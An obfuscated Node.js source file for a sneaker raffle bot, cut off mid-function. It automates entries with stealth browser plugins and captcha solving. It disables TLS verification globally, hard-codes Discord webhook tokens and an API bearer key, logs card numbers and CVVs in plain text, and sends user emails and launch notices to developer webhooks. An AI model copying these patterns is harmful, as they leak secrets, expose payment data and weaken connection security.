process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0xa4bb3a = require('fs'), _0x209177 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x44da9d(_0x4909da) {
    const _0x23aebd = _0xa4bb3a['createWriteStream'](_0x4909da, { 'flags': 'a' }), _0x4f132f = console['log'];
    console['log'] = function () {
        const _0x3c3bf0 = Array['prototype']['slice']['call'](arguments), _0x3087fa = _0x3c3bf0['join']('\x20') + '\x0a';
        _0x23aebd['write'](_0x3087fa), _0x4f132f['apply'](console, _0x3c3bf0);
    };
}
_0x44da9d('../logs/log\x20' + _0x209177);
var _0x4c0c76 = require('tough-cookie'), _0x2e8fd8 = require('node-imap'), _0x389b80 = require('util')['inspect'];
const _0x2f2a1d = require('mailparser')['simpleParser'], { EmbedBuilder: _0xb509fc } = require('discord.js');
var _0x38db06 = require('exe');
const { execFile: _0x406331 } = require('child_process'), _0x3d8cc4 = require('puppeteer-extra'), _0x173890 = require('puppeteer-extra-plugin-recaptcha'), _0x29d882 = require('puppeteer-extra-plugin-stealth'), _0x10a2e3 = require('chalk'), _0x1a7b1b = require('node-bash-title'), _0x2c480f = require('axios'), _0x5b1b10 = require('papaparse');
var _0x29c58c = require('random-name');
const _0x17f04c = require('request');
var _0x3432fc = require('prompt');
const _0x4a6742 = _0x17f04c['jar']();
var _0x30cea3 = {};
const _0x27f792 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x142c8e = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x1aaf81 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3a3294 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5f535d = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x10cb71 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x22b6fb = 'https://discord.com/api/webhooks/', _0x152627 = '' + _0x22b6fb + _0x1aaf81, _0x3708dd = '' + _0x22b6fb + _0x3a3294, _0x301a88 = '' + _0x22b6fb + _0x27f792, _0x31e47f = '' + _0x22b6fb + _0x142c8e, _0x3b111f = '' + _0x22b6fb + _0x5f535d, _0x14b3d3 = '' + _0x22b6fb + _0x10cb71;
const _0x4237fb = JSON['parse'](_0xa4bb3a['readFileSync']('../package.json', 'utf-8')), _0x1feaa0 = _0x4237fb['version'];
var _0x733fd9, _0x253bf1, _0x4854cf, _0x3285ed, _0xf2d0a4, _0x1f9581, _0x3373db, _0x4db8ba;
const _0x22b08a = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x38d10e = ![];
const _0x1ffd3f = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x2cf4cc = '0123456789';
var _0x598601 = _0x1ffd3f['split']('');
const _0x37dfbd = require('auto-git-update'), _0x3daac5 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x159afb = new _0x37dfbd(_0x3daac5);
async function _0x5b8db3() {
    _0xf2d0a4 = _0xa4bb3a['readdirSync']('../proxies'), _0x3285ed = _0xa4bb3a['readdirSync']('../tasks'), !_0xa4bb3a['existsSync']('../accounts/fenom.csv') && _0xa4bb3a['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0xa4bb3a['existsSync']('../accounts/paypal.csv') && _0xa4bb3a['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0xa4bb3a['existsSync']('../accounts/bstn.csv') && _0xa4bb3a['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0xa4bb3a['existsSync']('../accounts/eql.csv') && _0xa4bb3a['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0xa4bb3a['existsSync']('../failed-tasks.csv') && _0xa4bb3a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0xa4bb3a['existsSync']('../successful-tasks.csv') && _0xa4bb3a['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x30cea3 = JSON['parse'](_0xa4bb3a['readFileSync']('../settings.json', 'utf-8')), !_0x30cea3['delay'] && (_0x30cea3['delay'] = 0x3c, _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['threads'] && (_0x30cea3['threads'] = 0x1, _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['masterMail'] && (_0x30cea3['masterMail'] = 'yourmail@gmail.com', _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['masterPassword'] && (_0x30cea3['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['captchaKey'] && (_0x30cea3['captchaKey'] = '', _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['useRandomProxy'] && (_0x30cea3['useRandomProxy'] = !![], _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['shuffleTasks'] && (_0x30cea3['shuffleTasks'] = ![], _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), !_0x30cea3['webhook'] && (_0x30cea3['webhook'] = '', _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), _0x30cea3['delay'] <= 0x1388 && (_0x30cea3['delay'] = _0x30cea3['delay'] * 0x3e8), _0x30cea3['AfewDelay'] && (delete _0x30cea3['AfewDelay'], _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), _0x30cea3['MahaDelay'] && (delete _0x30cea3['MahaDelay'], _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), _0x30cea3['footshopDelay'] && (delete _0x30cea3['footshopDelay'], _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3, null, 0x2))), _0x30cea3['MahaDelay'] = _0x30cea3['delay'], _0x22b6fb = _0x30cea3['webhook'], _0x1f9581 = _0x30cea3['licenseKey'];
}
let _0x4c759c, _0x2c6858 = [], _0x422ee7;
const _0x2be9fc = _0x76d38c => new Promise(_0x178f12 => setTimeout(_0x178f12, _0x76d38c));
function _0xb2bcf5(_0x1d323b, _0x555b61) {
    return Math['floor'](Math['random']() * (_0x555b61 - _0x1d323b + 0x1) + _0x1d323b);
}
function _0x38dbd9(_0x107b2d) {
    let _0x55aa3a = _0x107b2d['length'], _0x3fed3c;
    while (_0x55aa3a != 0x0) {
        _0x3fed3c = Math['floor'](Math['random']() * _0x55aa3a), _0x55aa3a--, [_0x107b2d[_0x55aa3a], _0x107b2d[_0x3fed3c]] = [
            _0x107b2d[_0x3fed3c],
            _0x107b2d[_0x55aa3a]
        ];
    }
    return _0x107b2d;
}
async function _0x26562c(_0x53beab) {
    return _0x2c480f['get']('https://api.hyper.co/v4/licenses/' + _0x53beab, { 'headers': { 'Authorization': 'Bearer\x20' + _0x22b08a } })['then'](_0x5242b2 => _0x5242b2['data'])['catch'](() => null);
}
;
async function _0x290f40(_0x19831c) {
    console['clear']();
    if (_0x19831c == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x317a66 = await _0x3432fc['get']('License');
        if (_0x317a66['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x2be9fc(0xbb8), _0x290f40(_0x19831c);
        _0x19831c = _0x317a66['License'], _0x30cea3['licenseKey'] = _0x19831c, _0x1f9581 = _0x19831c, _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3));
    }
    console['log']('Checking\x20license\x20' + _0x1f9581 + '...'), await _0x2be9fc(0x320);
    const _0xf30943 = await _0x26562c(_0x19831c);
    _0x3373db = JSON['stringify'](_0xf30943['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x4db8ba = JSON['stringify'](_0xf30943['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xf30943)
        return console['log']('License\x20not\x20found');
    if (!_0xf30943['user'])
        return console['log']('License\x20not\x20bound');
    return _0xf30943['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x38d10e = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x38d10e = ![]);
}
async function _0x18aecd() {
    var _0x5dfe9e = await _0x3432fc['get']('Module');
    return console['clear'](), _0x5dfe9e['Module'];
}
;
async function _0x2654ae() {
    var _0x496e24 = await _0x3432fc['get']('Setting');
    return console['clear'](), _0x496e24['Setting'];
}
async function _0x265bfe(_0x505276) {
    var _0x3b841f = [];
    for (file of _0x3285ed) {
        var _0x3f22c5 = _0xa4bb3a['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x5b1b10['parse'](_0x3f22c5, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x505276['store'] && _0x3b841f['push'](file);
    }
    !_0x3b841f['length'] == 0x0 && (_0x3285ed = _0x3b841f);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x300438 = 0x0; _0x300438 < _0x3285ed['length']; _0x300438++) {
        console['log']('\x20(' + _0x300438 + ')\x20' + _0x3285ed[_0x300438]);
    }
    console['log']('');
    var _0x3d76b4 = await _0x3432fc['get']('Task');
    if (_0x3d76b4['Task'] > _0x3285ed['length'] - 0x1 || isNaN(_0x3d76b4['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x2be9fc(0x3e8), _0x265bfe();
    var _0x4f2db3 = _0xa4bb3a['readFileSync']('../tasks/' + _0x3285ed[_0x3d76b4['Task']], 'utf-8');
    return _0x4854cf = _0x5b1b10['parse'](_0x4f2db3, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x10a2e3['blue'](_0x3285ed[_0x3d76b4['Task']])), _0x733fd9 = _0x3285ed[_0x3d76b4['Task']], _0x4854cf;
}
async function _0x2f0fd() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x46be5a = 0x0; _0x46be5a < _0xf2d0a4['length']; _0x46be5a++) {
        console['log']('\x20(' + _0x46be5a + ')\x20' + _0xf2d0a4[_0x46be5a]);
    }
    console['log']('');
    var _0x53e810 = await _0x3432fc['get']('Proxies');
    if (_0x53e810['Proxies'] > _0xf2d0a4['length'] - 0x1 || isNaN(_0x53e810['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x2be9fc(0x3e8), _0x2f0fd();
    var _0x79923d = _0xa4bb3a['readFileSync']('../proxies/' + _0xf2d0a4[_0x53e810['Proxies']], 'utf-8')['split']('\x0a');
    let _0x371784 = _0x79923d['map']((_0x391be6, _0x4e5562) => {
        sanatizeProxy = _0x391be6['replace']('\x0d', '');
        if (_0x79923d[_0x4e5562 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x253bf1 = _0xf2d0a4[_0x53e810['Proxies']], console['clear'](), _0x371784;
}
async function _0x2fe4f7() {
    var _0xaf783d = await _0x3432fc['get']('Value');
    return console['clear'](), _0xaf783d['Value'];
}
async function _0x23c8d4(_0x5143c5) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x321202 = 0x0; _0x321202 < _0x5143c5['length']; _0x321202++) {
        console['log']('\x20(' + _0x321202 + ')\x20[' + _0x5143c5[_0x321202]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x132ec9 = await _0x3432fc['get']('Module');
    return _0x132ec9['Module'];
}
async function _0x1119b3() {
    var _0x1588d4 = await _0x3432fc['get']('Password');
    return console['clear'](), _0x1588d4['Password'];
}
;
async function _0x33fa10() {
    var _0x23ba4e = await _0x3432fc['get']('Links');
    return _0x23ba4e['Links'];
}
;
async function _0x53290c() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x51d95c = 0x0; _0x51d95c < _0x2c6858['length']; _0x51d95c++) {
        console['log']('\x20(' + _0x51d95c + ')\x20' + _0x2c6858[_0x51d95c]);
    }
    ;
    console['log']();
    let _0x56901b = await _0x3432fc['get']('Product');
    return console['clear'](), _0x56901b['Product'];
}
;
function _0x451967() {
    var _0xc1d171 = new Date(Date['now']())['toLocaleTimeString']();
    return _0xc1d171;
}
;
function _0xf2b70() {
    var _0x19ce07 = new Date(Date['now']())['toLocaleString']();
    return _0x19ce07['replace'](',', '');
}
async function _0x1bfffd(_0x38244b, _0x16ec91) {
    let _0x40e1e0 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x1feaa0 != 'devkey') {
        await _0x2c480f['post'](_0x38244b, _0x16ec91, _0x40e1e0);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x14203e(_0x4d867a, _0x3de90e, _0x2cf66c, _0x2043cd, _0x4e5c46) {
    if (!_0x2043cd && _0x2cf66c == 'dev') {
        var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x3de90e['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x3de90e['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4d867a['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x30cea3['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3373db,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4d867a['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x4d867a['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x1feaa0,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3b64fa['data'];
    } else {
        if (_0x2043cd && _0x2cf66c == 'dev') {
            var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x3de90e['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3373db,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x3de90e['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4d867a['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x30cea3['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4e5c46,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4d867a['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x4d867a['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x1feaa0,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3b64fa['data'];
        } else {
            if (_0x2cf66c == 'pub') {
                var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x3de90e['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x3de90e['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4d867a['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x30cea3['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4d867a['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x1feaa0,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3b64fa['data'];
            } else {
                if (_0x2cf66c == 'acc' && !_0x2043cd) {
                    var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x3de90e['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3373db,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x3de90e['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x30cea3['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x1feaa0,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3b64fa['data'];
                } else {
                    if (_0x2cf66c == 'acc' && _0x2043cd) {
                        var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x3de90e['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3373db,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4e5c46,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x3de90e['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x30cea3['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x1feaa0,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3b64fa['data'];
                    } else {
                        if (_0x2cf66c == 'open') {
                            var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x4db8ba)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3373db,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x1feaa0,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3b64fa['data'];
                        } else {
                            if (!_0x2043cd && _0x2cf66c == 'ver') {
                                var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x3de90e['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3373db,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x3de90e['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x30cea3['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x1feaa0,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3b64fa['data'];
                            } else {
                                if (_0x2043cd && _0x2cf66c == 'ver') {
                                    var _0x3b64fa = new _0xb509fc()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x3de90e['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3373db,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4e5c46,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x3de90e['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x30cea3['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x1feaa0,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3b64fa['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x319293(_0x9a3735, _0x46624d) {
    var _0x426ea = _0x9a3735[_0x46624d]['Address1']['split'](''), _0x4ca9e6 = _0x9a3735[_0x46624d]['Address2']['split'](''), _0x1844ac = _0x9a3735[_0x46624d]['Email']['split']('@');
    for (var _0x4aa610 = 0x0; _0x4aa610 < _0x426ea['length']; _0x4aa610++) {
        if (_0x426ea[_0x4aa610] == 'X') {
            var _0x5594be = Math['round'](Math['random']() * (_0x1ffd3f['length'] - 0x1));
            _0x426ea[_0x4aa610] = _0x598601[_0x5594be];
        }
    }
    ;
    for (var _0x4aa610 = 0x0; _0x4aa610 < _0x4ca9e6['length']; _0x4aa610++) {
        if (_0x4ca9e6[_0x4aa610] == 'X') {
            var _0x5594be = Math['round'](Math['random']() * (_0x1ffd3f['length'] - 0x1));
            _0x4ca9e6[_0x4aa610] = _0x598601[_0x5594be];
        }
    }
    ;
    _0x9a3735[_0x46624d]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x9a3735[_0x46624d]['FirstName'] = _0x29c58c['first']());
    _0x9a3735[_0x46624d]['LastName']['toUpperCase']() == 'RANDOM' && (_0x9a3735[_0x46624d]['LastName'] = _0x29c58c['last']());
    _0x1844ac[0x0]['toUpperCase']() == 'RANDOM' ? _0x1844ac[0x0] = '' + _0x29c58c['first']() + _0x29c58c['last']() + _0xb2bcf5(0x1, 0x3e7) + '@' : _0x1844ac[0x0] = _0x1844ac[0x0] + '@';
    _0x9a3735[_0x46624d]['Email'] = _0x1844ac['join'](''), _0x9a3735[_0x46624d]['Address1'] = _0x426ea['join'](''), _0x9a3735[_0x46624d]['Address2'] = _0x4ca9e6['join']('');
    _0x9a3735[_0x46624d]['Phone'] == 'RANDOM' && (_0x9a3735[_0x46624d]['Phone'] = '0' + _0xb2bcf5(0x5f5e100, 0x3b9ac9ff));
    if (_0x9a3735[_0x46624d]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x1b07d0 = _0xb2bcf5(0x1, 0x270f);
        _0x9a3735[_0x46624d]['Follower'] = '' + _0x29c58c['first']() + _0x29c58c['last']() + _0x1b07d0 + '\x20';
    }
    _0x9a3735[_0x46624d]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x9a3735[_0x46624d]['HouseNumber'] = _0xb2bcf5(0x1, 0xc8));
    if (_0x9a3735[_0x46624d]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x26518c = Math['round'](Math['random']() * (_0x1ffd3f['length'] - 0x1)), _0x33c259 = _0x598601[_0x26518c];
        _0x9a3735[_0x46624d]['Address1'] = _0x29c58c['last']() + 'straat', _0x9a3735[_0x46624d]['Zip'] == '' && (_0x9a3735[_0x46624d]['Postcode'] = _0xb2bcf5(0x3e8, 0x270f) + '\x20' + _0x33c259 + _0x33c259, _0x9a3735[_0x46624d]['Zip'] = _0x9a3735[_0x46624d]['Postcode']), _0x9a3735[_0x46624d]['HouseNumber'] = '' + _0xb2bcf5(0x1, 0xc8);
    }
    return;
}
;
async function _0x48f0c7(_0x39b589, _0x409a13) {
    _0xa4bb3a['appendFileSync']('../failed-tasks.csv', _0xf2b70() + ',' + _0x409a13['store'] + ',' + _0x409a13['name'] + ',' + _0x39b589['Url'] + ',' + _0x39b589['Size'] + ',' + _0x39b589['Follower'] + ',' + _0x39b589['FirstName'] + ',' + _0x39b589['LastName'] + ',' + _0x39b589['Address1'] + ',' + _0x39b589['Address2'] + ',' + _0x39b589['HouseNumber'] + ',' + _0x39b589['Zip'] + ',' + _0x39b589['City'] + ',' + _0x39b589['State'] + ',' + _0x39b589['Country'] + ',' + _0x39b589['Phone'] + ',' + _0x39b589['Email'] + ',' + _0x39b589['Password'] + ',' + _0x39b589['PaymentMethod'] + ',' + _0x39b589['CardType'] + ',' + _0x39b589['NameOnCard'] + ',' + _0x39b589['CardNumber'] + ',' + _0x39b589['ExpiryDate'] + ',' + _0x39b589['CVV'] + ',' + _0x39b589['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x34c52d(_0x2a9167, _0x128dc8) {
    _0xa4bb3a['appendFileSync']('../successful-tasks.csv', _0xf2b70() + ',' + _0x128dc8['store'] + ',' + _0x128dc8['name'] + ',' + _0x2a9167['Url'] + ',' + _0x2a9167['Size'] + ',' + _0x2a9167['Follower'] + ',' + _0x2a9167['FirstName'] + ',' + _0x2a9167['LastName'] + ',' + _0x2a9167['Address1'] + ',' + _0x2a9167['Address2'] + ',' + _0x2a9167['HouseNumber'] + ',' + _0x2a9167['Zip'] + ',' + _0x2a9167['City'] + ',' + _0x2a9167['State'] + ',' + _0x2a9167['Country'] + ',' + _0x2a9167['Phone'] + ',' + _0x2a9167['Email'] + ',' + _0x2a9167['Password'] + ',' + _0x2a9167['PaymentMethod'] + ',' + _0x2a9167['CardType'] + ',' + _0x2a9167['NameOnCard'] + ',' + _0x2a9167['CardNumber'] + ',' + _0x2a9167['ExpiryDate'] + ',' + _0x2a9167['CVV'] + ',' + _0x2a9167['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x38557d() {
    let _0x24f0cb = proxyFile['split']('\x0a'), _0x52ef1e = _0x24f0cb['map']((_0x30791c, _0x18eff0) => {
        sanatizeProxy = _0x30791c['replace']('\x0d', '');
        if (_0x24f0cb[_0x18eff0 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x52ef1e;
}
;
async function _0x3ce909(_0x32bb28, _0x305e37) {
    if (_0x476484 != 'yes')
        var _0x476484 = '', _0x465afe = 0x0;
    async function _0x167a6c() {
        var _0xaddefc = _0xa4bb3a['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x287327 = _0x5b1b10['parse'](_0xaddefc, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x3587de = 0x0; _0x3587de < _0x287327['length']; _0x3587de++) {
            console['log']('(' + _0x3587de + ')\x20' + _0x287327[_0x3587de]['Email']);
        }
        console['log']('\x0a(' + _0x287327['length'] + ')\x20' + _0x10a2e3['cyan']('Add\x20a\x20new\x20account'));
        let _0x5af796 = await _0x3432fc['get']('Option');
        if (_0x5af796['Option'] < _0x287327['length'])
            return _0x287327[_0x5af796['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x2d3472 = {}, _0x3816a7 = await _0x3432fc['get']('Email');
        _0x2d3472['Email'] = _0x3816a7['Email'];
